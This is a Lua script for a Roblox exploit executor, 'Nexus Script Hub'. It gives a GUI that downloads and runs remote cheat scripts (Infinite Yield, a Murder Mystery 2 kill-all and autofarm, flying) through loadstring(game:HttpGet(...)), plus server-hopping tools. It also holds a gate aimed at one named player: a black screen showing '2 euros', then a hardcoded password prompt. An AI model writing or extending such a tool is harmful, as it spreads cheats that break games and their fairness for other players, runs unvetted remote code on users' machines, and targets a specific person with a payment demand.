-- Nexus Script Hub

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer

local function getTargetParent()
	if typeof(gethui) == "function" then
		local ok, result = pcall(gethui)
		if ok and result then return result end
	end
	if pcall(function() return CoreGui.Name end) then return CoreGui end
	return LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
end
local TargetParent = getTargetParent()

local UI_NAME = "NexusScriptHub"
local previous = TargetParent:FindFirstChild(UI_NAME)
if previous then previous:Destroy() end

local Janitor = { Connections = {}, Instances = {} }
function Janitor:Connect(signal, fn)
	local conn = signal:Connect(fn)
	table.insert(self.Connections, conn)
	return conn
end
function Janitor:Track(inst) table.insert(self.Instances, inst) return inst end
function Janitor:Clean()
	for _, c in ipairs(self.Connections) do pcall(function() c:Disconnect() end) end
	for _, i in ipairs(self.Instances) do pcall(function() i:Destroy() end) end
	table.clear(self.Connections)
	table.clear(self.Instances)
end

-- Scripts ---------------------------------------------------------------------

local Scripts = {
	{ Name = "Infinite Yield", Source = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()' },
	{ Name = "Novoline", Source = 'loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Novoline-204721"))()' },
	{ Name = "Fly", Source = 'loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-fly-v3-by-hibatzzz-243731"))()' },
	{ Name = "Moondiety MM2", Source = 'loadstring(game:HttpGet("https://scriptblox.com/raw/Murder-Mystery-2-KEYLESS-InstaWin-AutoFarm-Kill-all-XRay-nd-more-by-Moondiety-48644"))()' },
	{ Name = "Foxname MM2", Source = 'loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Foxname-241528"))()' },
	{ Name = "YARHM", Source = 'loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-YARHM-12403"))()' },
	{ Name = "My MM2 Autofarm", Source = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/wvahub/mm2/refs/heads/main/autofarm"))()' },
	{
		Name = "PulseZax Loader",
		Source = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/PulseZax/Loader/refs/heads/main/.lua"))()',
		-- Usernames (lowercase) that get a black screen, then a password prompt, before the script runs.
		OverrideNames = {
			["cuenta2dmatthias"] = { Message = "2 euros", Password = "WilliamOnTop" },
		},
	},
}

-- Theme -----------------------------------------------------------------------

local C = {
	Window   = Color3.fromRGB(17, 17, 20),
	Panel    = Color3.fromRGB(23, 23, 27),
	Row      = Color3.fromRGB(26, 26, 31),
	RowHover = Color3.fromRGB(32, 32, 38),
	Border   = Color3.fromRGB(42, 42, 50),
	Text     = Color3.fromRGB(232, 232, 236),
	Dim      = Color3.fromRGB(122, 122, 134),
	Accent   = Color3.fromRGB(96, 165, 250),
	Running  = Color3.fromRGB(234, 179, 8),
	Success  = Color3.fromRGB(74, 222, 128),
	Error    = Color3.fromRGB(248, 113, 113),
}

local FONT = Enum.Font.BuilderSans
local FONT_MED = Enum.Font.BuilderSansMedium
local FONT_BOLD = Enum.Font.BuilderSansBold

-- Helpers ---------------------------------------------------------------------

local function new(class, props, children)
	local inst = Instance.new(class)
	local parent = props.Parent
	props.Parent = nil
	for k, v in pairs(props) do inst[k] = v end
	for _, child in ipairs(children or {}) do child.Parent = inst end
	inst.Parent = parent
	return inst
end

local function corner(r) return new("UICorner", { CornerRadius = UDim.new(0, r) }) end
local function stroke(color, transparency)
	return new("UIStroke", {
		Color = color or C.Border,
		Thickness = 1,
		Transparency = transparency or 0,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	})
end

local function tween(inst, props, duration)
	TweenService:Create(inst, TweenInfo.new(duration or 0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

-- Window ----------------------------------------------------------------------

local WIDTH, HEIGHT = 480, 440
local CENTER = UDim2.new(0.5, -WIDTH / 2, 0.5, -HEIGHT / 2)

local ScreenGui = Janitor:Track(new("ScreenGui", {
	Name = UI_NAME,
	ResetOnSpawn = false,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
}))

local Main = new("Frame", {
	Name = "Main",
	Size = UDim2.fromOffset(WIDTH, HEIGHT),
	Position = CENTER,
	BackgroundColor3 = C.Window,
	BorderSizePixel = 0,
	ClipsDescendants = true,
	Parent = ScreenGui,
}, { corner(8), stroke(C.Border) })

-- Header
local Header = new("Frame", {
	Name = "Header",
	Size = UDim2.new(1, 0, 0, 46),
	BackgroundTransparency = 1,
	Parent = Main,
})

new("TextLabel", {
	Size = UDim2.new(1, -120, 1, 0),
	Position = UDim2.fromOffset(16, 0),
	BackgroundTransparency = 1,
	RichText = true,
	Text = 'Nexus <font color="rgb(122,122,134)">Script Hub</font>',
	TextColor3 = C.Text,
	Font = FONT_BOLD,
	TextSize = 15,
	TextXAlignment = Enum.TextXAlignment.Left,
	Parent = Header,
})

new("Frame", {
	Size = UDim2.new(1, 0, 0, 1),
	Position = UDim2.new(0, 0, 1, -1),
	BackgroundColor3 = C.Border,
	BorderSizePixel = 0,
	Parent = Header,
})

local Controls = new("Frame", {
	Size = UDim2.fromOffset(64, 28),
	AnchorPoint = Vector2.new(1, 0.5),
	Position = UDim2.new(1, -10, 0.5, 0),
	BackgroundTransparency = 1,
	Parent = Header,
}, {
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal,
		HorizontalAlignment = Enum.HorizontalAlignment.Right,
		VerticalAlignment = Enum.VerticalAlignment.Center,
		Padding = UDim.new(0, 4),
		SortOrder = Enum.SortOrder.LayoutOrder,
	}),
})

local function controlButton(text, order, hoverColor)
	local btn = new("TextButton", {
		Size = UDim2.fromOffset(28, 28),
		BackgroundColor3 = C.Row,
		BackgroundTransparency = 1,
		Text = text,
		TextColor3 = C.Dim,
		Font = FONT_MED,
		TextSize = 18,
		AutoButtonColor = false,
		BorderSizePixel = 0,
		LayoutOrder = order,
		Parent = Controls,
	}, { corner(6) })
	Janitor:Connect(btn.MouseEnter, function()
		tween(btn, { BackgroundTransparency = 0, TextColor3 = hoverColor })
	end)
	Janitor:Connect(btn.MouseLeave, function()
		tween(btn, { BackgroundTransparency = 1, TextColor3 = C.Dim })
	end)
	return btn
end

local MinimizeBtn = controlButton("–", 1, C.Text)
local CloseBtn = controlButton("×", 2, C.Error)

-- Search
local Search = new("TextBox", {
	Size = UDim2.new(1, -32, 0, 34),
	Position = UDim2.fromOffset(16, 58),
	BackgroundColor3 = C.Panel,
	BorderSizePixel = 0,
	ClearTextOnFocus = false,
	PlaceholderText = "Search scripts",
	PlaceholderColor3 = C.Dim,
	Text = "",
	TextColor3 = C.Text,
	Font = FONT,
	TextSize = 14,
	TextXAlignment = Enum.TextXAlignment.Left,
	Parent = Main,
}, {
	corner(6),
	new("UIPadding", { PaddingLeft = UDim.new(0, 12), PaddingRight = UDim.new(0, 12) }),
})
local SearchStroke = stroke(C.Border)
SearchStroke.Parent = Search
Janitor:Connect(Search.Focused, function() tween(SearchStroke, { Color = C.Accent }) end)
Janitor:Connect(Search.FocusLost, function() tween(SearchStroke, { Color = C.Border }) end)

-- Server toolbar
local hop -- defined below

local Toolbar = new("Frame", {
	Name = "Toolbar",
	Size = UDim2.new(1, -32, 0, 30),
	Position = UDim2.fromOffset(16, 102),
	BackgroundTransparency = 1,
	Parent = Main,
}, {
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal,
		Padding = UDim.new(0, 8),
		SortOrder = Enum.SortOrder.LayoutOrder,
	}),
})

local function toolbarButton(text, kind, order)
	local btn = new("TextButton", {
		Size = UDim2.new(0.25, -6, 1, 0),
		BackgroundColor3 = C.Panel,
		Text = text,
		TextColor3 = C.Text,
		Font = FONT_MED,
		TextSize = 12,
		AutoButtonColor = false,
		BorderSizePixel = 0,
		LayoutOrder = order,
		Parent = Toolbar,
	}, { corner(6), stroke(C.Border) })
	Janitor:Connect(btn.MouseEnter, function() tween(btn, { BackgroundColor3 = C.RowHover }) end)
	Janitor:Connect(btn.MouseLeave, function() tween(btn, { BackgroundColor3 = C.Panel }) end)
	Janitor:Connect(btn.MouseButton1Click, function() hop(kind) end)
	return btn
end

toolbarButton("Server Hop", "hop", 1)
toolbarButton("Small Server", "small", 2)
toolbarButton("Big Server", "big", 3)
toolbarButton("Rejoin", "rejoin", 4)

-- List
local List = new("ScrollingFrame", {
	Name = "List",
	Size = UDim2.new(1, -16, 1, -184),
	Position = UDim2.fromOffset(8, 144),
	BackgroundTransparency = 1,
	BorderSizePixel = 0,
	ScrollBarThickness = 3,
	ScrollBarImageColor3 = C.Border,
	CanvasSize = UDim2.new(),
	AutomaticCanvasSize = Enum.AutomaticSize.Y,
	Parent = Main,
}, {
	new("UIListLayout", { Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder }),
	new("UIPadding", { PaddingLeft = UDim.new(0, 8), PaddingRight = UDim.new(0, 8) }),
})

-- Footer
new("Frame", {
	Size = UDim2.new(1, 0, 0, 1),
	Position = UDim2.new(0, 0, 1, -34),
	BackgroundColor3 = C.Border,
	BorderSizePixel = 0,
	Parent = Main,
})

local CountLabel = new("TextLabel", {
	Size = UDim2.new(0.4, -16, 0, 34),
	Position = UDim2.new(0, 16, 1, -34),
	BackgroundTransparency = 1,
	Text = "",
	TextColor3 = C.Dim,
	Font = FONT,
	TextSize = 12,
	TextXAlignment = Enum.TextXAlignment.Left,
	Parent = Main,
})

local ServerStatus = new("TextLabel", {
	Size = UDim2.new(0.6, -16, 0, 34),
	Position = UDim2.new(0.4, 0, 1, -34),
	BackgroundTransparency = 1,
	Text = "",
	TextColor3 = C.Dim,
	Font = FONT,
	TextSize = 12,
	TextXAlignment = Enum.TextXAlignment.Right,
	TextTruncate = Enum.TextTruncate.AtEnd,
	Parent = Main,
})

local function setServerStatus(text, color)
	ServerStatus.Text = text
	ServerStatus.TextColor3 = color or C.Dim
end

-- Restore pill
local RESTORE_HIDDEN = UDim2.new(0.5, -50, 1, 50)
local RESTORE_SHOWN = UDim2.new(0.5, -50, 1, -52)

local RestoreBtn = new("TextButton", {
	Name = "Restore",
	Size = UDim2.fromOffset(100, 32),
	Position = RESTORE_HIDDEN,
	BackgroundColor3 = C.Window,
	Text = "Nexus",
	TextColor3 = C.Text,
	Font = FONT_MED,
	TextSize = 13,
	AutoButtonColor = false,
	BorderSizePixel = 0,
	Visible = false,
	Parent = ScreenGui,
}, { corner(16), stroke(C.Border) })

-- Rows ------------------------------------------------------------------------

-- Full-screen message, then a password prompt. Calls onSuccess on the right
-- password and onClose if the user dismisses it.
local function showGate(opts, onSuccess, onClose)
	local Message = new("TextLabel", {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		Text = opts.Message,
		TextColor3 = Color3.new(1, 1, 1),
		Font = FONT_BOLD,
		TextSize = 36,
		TextWrapped = true,
		ZIndex = 1001,
	})

	local Backdrop = new("Frame", {
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = Color3.new(0, 0, 0),
		BorderSizePixel = 0,
		Active = true,
		ZIndex = 1000,
	}, { Message })

	local overlay = new("ScreenGui", {
		Name = UI_NAME .. "_Overlay",
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		DisplayOrder = 2147483647,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	}, { Backdrop })
	overlay.Parent = TargetParent
	Janitor:Track(overlay)

	local function dismiss(callback)
		if overlay.Parent then overlay:Destroy() end
		if callback then callback() end
	end

	task.delay(3, function()
		if not overlay.Parent then return end
		Message.Visible = false

		local Panel = new("Frame", {
			Size = UDim2.fromOffset(320, 190),
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.fromScale(0.5, 0.5),
			BackgroundColor3 = C.Window,
			BorderSizePixel = 0,
			ZIndex = 1002,
			Parent = Backdrop,
		}, { corner(8), stroke(C.Border) })

		new("TextLabel", {
			Size = UDim2.new(1, 0, 0, 40),
			Position = UDim2.fromOffset(0, 12),
			BackgroundTransparency = 1,
			Text = "Enter password",
			TextColor3 = C.Text,
			Font = FONT_BOLD,
			TextSize = 18,
			ZIndex = 1003,
			Parent = Panel,
		})

		local Input = new("TextBox", {
			Size = UDim2.new(1, -40, 0, 36),
			Position = UDim2.fromOffset(20, 58),
			BackgroundColor3 = C.Panel,
			BorderSizePixel = 0,
			ClearTextOnFocus = false,
			PlaceholderText = "Password",
			PlaceholderColor3 = C.Dim,
			Text = "",
			TextColor3 = C.Text,
			Font = FONT,
			TextSize = 15,
			ZIndex = 1003,
			Parent = Panel,
		}, { corner(6), stroke(C.Border) })

		local Feedback = new("TextLabel", {
			Size = UDim2.new(1, -40, 0, 16),
			Position = UDim2.fromOffset(20, 98),
			BackgroundTransparency = 1,
			Text = "",
			TextColor3 = C.Error,
			Font = FONT,
			TextSize = 12,
			TextXAlignment = Enum.TextXAlignment.Left,
			ZIndex = 1003,
			Parent = Panel,
		})

		local function panelButton(text, xScale, xOffset, color, filled)
			local btn = new("TextButton", {
				Size = UDim2.new(0.5, -26, 0, 34),
				Position = UDim2.new(xScale, xOffset, 0, 134),
				BackgroundColor3 = color,
				BackgroundTransparency = filled and 0.85 or 0,
				Text = text,
				TextColor3 = filled and C.Accent or C.Text,
				Font = FONT_MED,
				TextSize = 14,
				AutoButtonColor = false,
				BorderSizePixel = 0,
				ZIndex = 1003,
				Parent = Panel,
			}, { corner(6), stroke(filled and C.Accent or C.Border, filled and 0.5 or 0) })
			return btn
		end

		local Close = panelButton("Close", 0, 20, C.Panel, false)
		local Submit = panelButton("Submit", 0.5, 6, C.Accent, true)

		local function submit()
			if Input.Text == opts.Password then
				dismiss(onSuccess)
			else
				Feedback.Text = "Wrong password"
				Input.Text = ""
			end
		end

		Submit.MouseButton1Click:Connect(submit)
		Input.FocusLost:Connect(function(enterPressed)
			if enterPressed then submit() end
		end)
		Close.MouseButton1Click:Connect(function() dismiss(onClose) end)
	end)
end

local Rows = {}

local function updateCount()
	local visible = 0
	for _, row in ipairs(Rows) do
		if row.Frame.Visible then visible += 1 end
	end
	if visible == #Rows then
		CountLabel.Text = ("%d scripts"):format(#Rows)
	else
		CountLabel.Text = ("%d of %d scripts"):format(visible, #Rows)
	end
end

for index, item in ipairs(Scripts) do
	local Row = new("Frame", {
		Name = item.Name,
		Size = UDim2.new(1, 0, 0, 52),
		BackgroundColor3 = C.Row,
		BorderSizePixel = 0,
		LayoutOrder = index,
		Parent = List,
	}, { corner(6), stroke(C.Border, 0.5) })

	new("TextLabel", {
		Size = UDim2.new(1, -120, 0, 18),
		Position = UDim2.fromOffset(14, 9),
		BackgroundTransparency = 1,
		Text = item.Name,
		TextColor3 = C.Text,
		Font = FONT_MED,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = Row,
	})

	local Dot = new("Frame", {
		Size = UDim2.fromOffset(6, 6),
		Position = UDim2.fromOffset(14, 33),
		BackgroundColor3 = C.Dim,
		BorderSizePixel = 0,
		Parent = Row,
	}, { corner(3) })

	local Status = new("TextLabel", {
		Size = UDim2.new(1, -140, 0, 14),
		Position = UDim2.fromOffset(26, 29),
		BackgroundTransparency = 1,
		Text = "Ready",
		TextColor3 = C.Dim,
		Font = FONT,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
		Parent = Row,
	})

	local Run = new("TextButton", {
		Size = UDim2.fromOffset(68, 28),
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -12, 0.5, 0),
		BackgroundColor3 = C.Accent,
		BackgroundTransparency = 0.88,
		Text = "Run",
		TextColor3 = C.Accent,
		Font = FONT_MED,
		TextSize = 13,
		AutoButtonColor = false,
		BorderSizePixel = 0,
		Parent = Row,
	}, { corner(6) })

	local function setStatus(text, color)
		Status.Text = text
		Status.TextColor3 = (color == C.Dim) and C.Dim or color
		tween(Dot, { BackgroundColor3 = color })
	end

	Janitor:Connect(Row.MouseEnter, function() tween(Row, { BackgroundColor3 = C.RowHover }) end)
	Janitor:Connect(Row.MouseLeave, function() tween(Row, { BackgroundColor3 = C.Row }) end)
	Janitor:Connect(Run.MouseEnter, function() tween(Run, { BackgroundTransparency = 0.72 }) end)
	Janitor:Connect(Run.MouseLeave, function() tween(Run, { BackgroundTransparency = 0.88 }) end)

	local busy = false

	local function execute()
		Run.Text = "..."
		setStatus("Running", C.Running)

		task.spawn(function()
			local ok, err = pcall(function()
				if typeof(loadstring) ~= "function" then
					error("loadstring is unavailable in this environment", 0)
				end
				local fn, compileError = loadstring(item.Source)
				if not fn then error(compileError, 0) end
				fn()
			end)

			if ok then
				setStatus("Executed", C.Success)
			else
				setStatus(tostring(err):sub(1, 60), C.Error)
			end
			Run.Text = "Run"

			task.wait(2)
			if Row.Parent then setStatus("Ready", C.Dim) end
			busy = false
		end)
	end

	Janitor:Connect(Run.MouseButton1Click, function()
		if busy then return end
		busy = true

		-- Optional per-user access list
		if item.Allowed and not item.Allowed[LocalPlayer.UserId] then
			setStatus("This script is not available right now", C.Error)
			task.delay(2, function()
				if Row.Parent then setStatus("Ready", C.Dim) end
				busy = false
			end)
			return
		end

		-- Optional per-username gate: message, then password
		local gate = item.OverrideNames and item.OverrideNames[LocalPlayer.Name:lower()]
		if gate then
			showGate(gate, execute, function() busy = false end)
			return
		end

		execute()
	end)

	table.insert(Rows, { Frame = Row, Name = item.Name:lower() })
end

updateCount()

Janitor:Connect(Search:GetPropertyChangedSignal("Text"), function()
	local query = Search.Text:lower()
	for _, row in ipairs(Rows) do
		row.Frame.Visible = query == "" or row.Name:find(query, 1, true) ~= nil
	end
	updateCount()
end)

-- Server hopping ---------------------------------------------------------------

local PlaceId, JobId = game.PlaceId, game.JobId

local function httpGet(url)
	local ok, body = pcall(function() return game:HttpGet(url) end)
	if ok and type(body) == "string" and #body > 0 then return body end

	local req = (typeof(request) == "function" and request) or (typeof(http_request) == "function" and http_request)
	if req then
		local ok2, res = pcall(req, { Url = url, Method = "GET" })
		if ok2 and res and res.Body then return res.Body end
	end
	error(ok and "Empty response" or tostring(body), 0)
end

-- order: "Asc" = fewest players first, "Desc" = most players first
local function fetchServers(order, maxPages, collectAll)
	local candidates, cursor = {}, nil
	for _ = 1, maxPages do
		local url = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100"):format(PlaceId, order)
		if cursor then url = url .. "&cursor=" .. cursor end

		local data = HttpService:JSONDecode(httpGet(url))
		for _, server in ipairs(data.data or {}) do
			if server.id ~= JobId and server.playing < server.maxPlayers then
				table.insert(candidates, server)
			end
		end

		cursor = data.nextPageCursor
		if not cursor or (not collectAll and #candidates > 0) then break end
	end
	return candidates
end

local hopping = false

local function finishHop(delay)
	task.wait(delay)
	if ScreenGui.Parent then setServerStatus("") end
	hopping = false
end

hop = function(kind)
	if hopping then return end
	hopping = true
	setServerStatus(kind == "rejoin" and "Rejoining..." or "Searching for a server...", C.Running)

	task.spawn(function()
		local ok, err = pcall(function()
			if kind == "rejoin" then
				if #Players:GetPlayers() <= 1 or JobId == "" then
					TeleportService:Teleport(PlaceId, LocalPlayer)
				else
					TeleportService:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer)
				end
				return
			end

			local list
			if kind == "hop" then
				list = fetchServers("Asc", 3, true)
			elseif kind == "small" then
				list = fetchServers("Asc", 2, false)
			else
				list = fetchServers("Desc", 2, false)
			end
			if #list == 0 then error("No other servers found", 0) end

			local target = (kind == "hop") and list[math.random(#list)] or list[1]
			setServerStatus(("Joining server (%d/%d players)"):format(target.playing, target.maxPlayers), C.Running)
			TeleportService:TeleportToPlaceInstance(PlaceId, target.id, LocalPlayer)
		end)

		if ok then
			-- Teleport is in flight; unlock again if it never happens.
			finishHop(10)
		else
			local msg = tostring(err)
			if msg:find("429") then msg = "Rate limited, try again in a moment" end
			setServerStatus(msg:sub(1, 60), C.Error)
			finishHop(3)
		end
	end)
end

Janitor:Connect(TeleportService.TeleportInitFailed, function(player, _, message)
	if player ~= LocalPlayer then return end
	setServerStatus("Teleport failed: " .. tostring(message):sub(1, 40), C.Error)
	task.spawn(finishHop, 3)
end)

-- Minimize / restore / close --------------------------------------------------

local minimized = false

local function minimize()
	if minimized then return end
	minimized = true
	Main.Visible = false
	RestoreBtn.Visible = true
	tween(RestoreBtn, { Position = RESTORE_SHOWN }, 0.15)
end

local function restore()
	if not minimized then return end
	minimized = false
	RestoreBtn.Visible = false
	RestoreBtn.Position = RESTORE_HIDDEN
	Main.Visible = true
end

Janitor:Connect(MinimizeBtn.MouseButton1Click, minimize)
Janitor:Connect(RestoreBtn.MouseButton1Click, restore)
Janitor:Connect(CloseBtn.MouseButton1Click, function() Janitor:Clean() end)

-- Dragging --------------------------------------------------------------------

local dragging, dragStart, startPos = false, nil, nil

Janitor:Connect(Header.InputBegan, function(input)
	local t = input.UserInputType
	if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = Main.Position
	end
end)

Janitor:Connect(UserInputService.InputChanged, function(input)
	if not dragging then return end
	local t = input.UserInputType
	if t == Enum.UserInputType.MouseMovement or t == Enum.UserInputType.Touch then
		local d = input.Position - dragStart
		Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
	end
end)

Janitor:Connect(UserInputService.InputEnded, function(input)
	local t = input.UserInputType
	if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
		dragging = false
	end
end)

-- Everything is built off-screen; parenting once keeps startup instant.
ScreenGui.Parent = TargetParent
